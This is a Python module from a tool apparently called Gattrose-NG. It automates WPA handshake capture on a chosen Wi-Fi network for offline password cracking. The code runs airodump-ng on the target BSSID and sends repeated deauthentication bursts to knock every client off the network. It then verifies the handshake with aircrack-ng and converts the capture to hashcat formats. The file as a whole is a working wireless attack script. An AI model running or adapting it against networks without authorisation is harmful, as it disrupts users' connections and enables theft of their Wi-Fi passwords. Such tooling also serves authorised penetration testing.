"""
Handshake Capture Service for Gattrose-NG
Captures WPA handshakes for offline cracking
"""

import subprocess
import time
import re
from pathlib import Path
from typing import Optional, Callable
from .deauth_service import DeauthService


class HandshakeService:
    """Service for capturing WPA handshakes"""

    def __init__(self, interface: str):
        self.interface = interface
        self.capture_dir = Path("/tmp/gattrose-handshakes")
        self.capture_dir.mkdir(exist_ok=True, parents=True)
        self.airodump_process = None
        self.running = False
        self.deauth_service = DeauthService(interface)

    def capture_handshake(self, bssid: str, channel: str, essid: str = "",
                         timeout: int = 300,
                         auto_deauth: bool = True,
                         progress_callback: Callable = None,
                         status_callback: Callable = None) -> dict:
        """
        Capture WPA handshake from target network
        timeout: Max time to wait in seconds (default 5 minutes)
        auto_deauth: Automatically deauth clients if no natural handshake
        Returns: {'success': bool, 'file': str, 'error': str}
        """
        if self.running:
            return {'success': False, 'error': 'Capture already in progress'}

        self.running = True

        print(f"[HANDSHAKE] Starting capture for {essid} ({bssid}) on channel {channel}")

        try:
            # Generate output filename
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_essid = re.sub(r'[^\w\-]', '_', essid) if essid else "hidden"
            output_prefix = self.capture_dir / f"handshake_{safe_essid}_{bssid.replace(':', '')}_{timestamp}"

            # Build airodump command for targeted capture
            cmd = [
                'sudo', 'airodump-ng',
                '--bssid', bssid,
                '--channel', channel,
                '--write', str(output_prefix),
                '--output-format', 'pcap',
                self.interface
            ]

            if status_callback:
                status_callback(f"Starting capture on {essid} ({bssid})...")

            if progress_callback:
                progress_callback(10)

            # Start airodump capture
            self.airodump_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )

            print(f"[HANDSHAKE] Waiting for handshake capture...")

            # Phase 1: Wait for natural handshake (30 seconds)
            if status_callback:
                status_callback("Waiting for client reconnection...")

            if progress_callback:
                progress_callback(20)

            time.sleep(30)

            # Check if handshake captured
            cap_file = str(output_prefix) + "-01.cap"
            if self._verify_handshake(cap_file):
                print(f"[HANDSHAKE] ✓ Natural handshake captured!")
                self.airodump_process.terminate()

                if status_callback:
                    status_callback("✓ Handshake captured (natural)")

                if progress_callback:
                    progress_callback(100)

                return {
                    'success': True,
                    'file': cap_file,
                    'bssid': bssid,
                    'essid': essid,
                    'method': 'natural'
                }

            # Phase 2: Deauth attack to force handshake
            if auto_deauth:
                print(f"[HANDSHAKE] No natural handshake, performing deauth attack...")

                if status_callback:
                    status_callback("Sending deauth packets to force reconnection...")

                if progress_callback:
                    progress_callback(40)

                # Send 5 deauth packets
                deauth_result = self.deauth_service.deauth_all_clients(bssid, count=5)

                if not deauth_result['success']:
                    print(f"[HANDSHAKE] Warning: Deauth failed - {deauth_result.get('error')}")

                # Wait for handshake after deauth
                if status_callback:
                    status_callback("Waiting for handshake...")

                if progress_callback:
                    progress_callback(60)

                time.sleep(60)  # Wait 1 minute for clients to reconnect

                # Verify handshake again
                if self._verify_handshake(cap_file):
                    print(f"[HANDSHAKE] ✓ Handshake captured after deauth!")
                    self.airodump_process.terminate()

                    if status_callback:
                        status_callback("✓ Handshake captured (deauth)")

                    if progress_callback:
                        progress_callback(100)

                    return {
                        'success': True,
                        'file': cap_file,
                        'bssid': bssid,
                        'essid': essid,
                        'method': 'deauth'
                    }

                # Phase 3: Multiple deauth attempts
                print(f"[HANDSHAKE] Trying additional deauth attempts...")

                for attempt in range(3):
                    if status_callback:
                        status_callback(f"Deauth attempt {attempt + 2}/4...")

                    if progress_callback:
                        progress_callback(60 + (attempt * 10))

                    # Stronger deauth
                    self.deauth_service.deauth_all_clients(bssid, count=10)
                    time.sleep(30)

                    if self._verify_handshake(cap_file):
                        print(f"[HANDSHAKE] ✓ Handshake captured on attempt {attempt + 2}!")
                        self.airodump_process.terminate()

                        if status_callback:
                            status_callback(f"✓ Handshake captured (attempt {attempt + 2})")

                        if progress_callback:
                            progress_callback(100)

                        return {
                            'success': True,
                            'file': cap_file,
                            'bssid': bssid,
                            'essid': essid,
                            'method': f'deauth_attempt_{attempt + 2}'
                        }

            # Timeout - no handshake captured
            print(f"[HANDSHAKE] Failed to capture handshake within timeout")
            self.airodump_process.terminate()

            return {
                'success': False,
                'error': f'No handshake captured within {timeout}s',
                'file': cap_file
            }

        except Exception as e:
            print(f"[HANDSHAKE] Error: {e}")
            if self.airodump_process:
                self.airodump_process.kill()

            return {'success': False, 'error': str(e)}

        finally:
            self.running = False
            self.airodump_process = None

    def _verify_handshake(self, cap_file: str, detailed: bool = False) -> bool:
        """
        Verify if handshake exists in capture file using aircrack-ng

        Args:
            cap_file: Path to capture file
            detailed: If True, verify we have minimum M1+M2 frames (completeness >= 60)

        Returns: True if handshake found and meets requirements
        """
        if not Path(cap_file).exists():
            return False

        try:
            # Basic aircrack-ng verification
            result = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True,
                text=True,
                timeout=10
            )

            # Check for handshake indicators in output
            output = result.stdout.lower()

            if "1 handshake" in output or "handshake" in output:
                # Verify it's not "0 handshakes"
                if "0 handshake" not in output:
                    # If detailed verification requested, check EAPOL frames
                    if detailed:
                        from .handshake_analysis import HandshakeAnalyzer
                        analyzer = HandshakeAnalyzer()
                        analysis = analyzer.analyze_handshake(cap_file)

                        completeness = analysis.get('completeness_score', 0)
                        if completeness >= 60:  # At least M1+M2
                            print(f"[HANDSHAKE] ✓ Handshake verified (completeness: {completeness}%)")
                            return True
                        else:
                            print(f"[HANDSHAKE] ✗ Handshake incomplete (completeness: {completeness}%), need M1+M2 minimum")
                            return False
                    else:
                        print(f"[HANDSHAKE] ✓ Handshake verified in {cap_file}")
                        return True

            return False

        except subprocess.TimeoutExpired:
            return False
        except Exception as e:
            print(f"[HANDSHAKE] Verification error: {e}")
            return False

    def convert_to_hccapx(self, cap_file: str) -> Optional[str]:
        """
        Convert .cap file to .hccapx format for hashcat
        Returns: path to .hccapx file or None
        """
        try:
            hccapx_file = cap_file.replace('.cap', '.hccapx')

            result = subprocess.run(
                ['cap2hccapx', cap_file, hccapx_file],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0 and Path(hccapx_file).exists():
                print(f"[HANDSHAKE] ✓ Converted to hccapx: {hccapx_file}")
                return hccapx_file
            else:
                print(f"[HANDSHAKE] Failed to convert to hccapx: {result.stderr}")
                return None

        except Exception as e:
            print(f"[HANDSHAKE] Conversion error: {e}")
            return None

    def convert_to_hashcat_22000(self, cap_file: str) -> Optional[str]:
        """
        Convert .cap file to hashcat 22000 format using hcxpcapngtool
        This is the newer format for WPA/WPA2
        Returns: path to .22000 file or None
        """
        try:
            hash_file = cap_file.replace('.cap', '.22000')

            result = subprocess.run(
                ['hcxpcapngtool', '-o', hash_file, cap_file],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0 and Path(hash_file).exists():
                print(f"[HANDSHAKE] ✓ Converted to hashcat format: {hash_file}")
                return hash_file
            else:
                print(f"[HANDSHAKE] hcxpcapngtool not available or failed, falling back to cap2hccapx")
                return self.convert_to_hccapx(cap_file)

        except FileNotFoundError:
            print(f"[HANDSHAKE] hcxpcapngtool not found, using cap2hccapx")
            return self.convert_to_hccapx(cap_file)
        except Exception as e:
            print(f"[HANDSHAKE] Conversion error: {e}")
            return None

    def stop(self):
        """Stop ongoing capture"""
        self.running = False
        if self.airodump_process:
            try:
                self.airodump_process.terminate()
                self.airodump_process.wait(timeout=5)
            except:
                self.airodump_process.kill()
            print("[HANDSHAKE] Capture stopped")

    def list_captured_handshakes(self) -> list:
        """List all captured handshake files"""
        handshakes = []
        for cap_file in self.capture_dir.glob("*.cap"):
            if self._verify_handshake(str(cap_file)):
                handshakes.append({
                    'file': str(cap_file),
                    'size': cap_file.stat().st_size,
                    'modified': cap_file.stat().st_mtime
                })
        return handshakes
